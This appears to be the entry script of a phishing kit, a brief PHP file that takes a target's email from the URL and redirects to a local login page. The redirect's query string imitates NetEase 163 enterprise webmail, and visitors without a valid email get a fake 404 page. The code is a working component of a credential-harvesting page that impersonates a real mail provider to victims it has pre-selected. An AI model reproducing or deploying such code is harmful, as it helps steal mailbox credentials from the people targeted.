<?php

session_start();

require 'login/api.php';

if (isset($_GET['email'])) {
$email = $_GET['email'];
}
$msg_id = base64_encode($email);

if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header ("Location: login/?hl=zh_CN&webmailhost=mailhz.qiye.163.com&all_secure=1&ch=hw&msg=$msg_id&from=hz");
}
else{
     include "login/404.php";
}

?>